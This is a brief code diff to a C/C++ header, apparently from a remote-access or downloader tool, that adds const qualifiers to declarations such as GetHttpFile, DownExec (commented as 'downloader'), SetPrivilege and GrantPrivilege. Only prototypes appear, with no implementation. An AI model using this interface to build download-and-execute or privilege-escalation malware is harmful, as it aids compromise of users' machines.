@@ -39,12 +39,12 @@ void DecryptData(unsigned char *szRec, unsigned long nLen, unsigned long key);
 BOOL WINAPI SetPrivilege(LPCTSTR lpszPrivilege);
 
 //读取网页数据
-char* GetHttpFile(char Url[]);
+char* GetHttpFile(const char Url[]);
 
 //下载者
-void DownExec(char url[]);
+void DownExec(const char url[]);
 //打开网页
-void OpenUrl(char url[]);
+void OpenUrl(const char url[]);
 
 BOOL OpenUserDesktop();
 int GrantPrivilege();
